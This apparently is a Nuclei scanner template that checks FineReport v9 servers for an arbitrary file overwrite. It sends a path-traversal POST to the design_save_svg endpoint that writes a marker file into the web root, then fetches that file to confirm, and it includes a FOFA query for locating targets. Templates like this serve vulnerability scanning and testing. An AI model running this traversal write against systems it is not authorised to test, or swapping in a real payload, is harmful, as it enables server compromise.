id: fine-report-v9-file-upload-2

info:
  name: FineReport v9 Arbitrary File Overwrite
  author: SleepingBag945
  severity: critical
  reference:
    - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.
  metadata:
    max-request: 2
    fofa-query: app="帆软-FineReport"
  tags: 帆软-FineReport
variables:
  string: '{{rand_base(8, "abc")}}'

http:
  - raw:
      - |
        POST /ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWebReport/log.svg.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: zh-CN,zh;q=0.9
        Content-Disposition: attachment; filename="filename.jpg"
        Content-Type: application/octet-stream
        Connection: keep-alive

        {"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}
      - |
        GET /log.svg.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body_2
        words:
          - "{{string}}"

